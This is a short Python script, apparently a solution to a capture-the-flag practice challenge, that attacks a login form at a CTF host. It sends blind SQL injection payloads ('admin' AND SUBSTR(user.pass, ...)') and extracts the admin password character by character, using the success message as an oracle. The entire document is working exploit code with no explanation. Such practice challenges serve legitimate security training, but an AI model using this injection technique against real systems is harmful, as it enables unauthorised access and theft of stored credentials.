import requests
url = "http://ctfq.sweetduet.info:10080/~q6/"

String = ""
for index in range(1,22):
  for char in range(48,127):
    data = {"id": "admin' AND SUBSTR(user.pass,"+str(index)+",1) = '"+str(chr(char))+"'  /*"}
    if "Congratulations!<br>" in requests.post(url, data).text:
      String += str(chr(char))
      print(str(chr(char)))
      break

print(String)
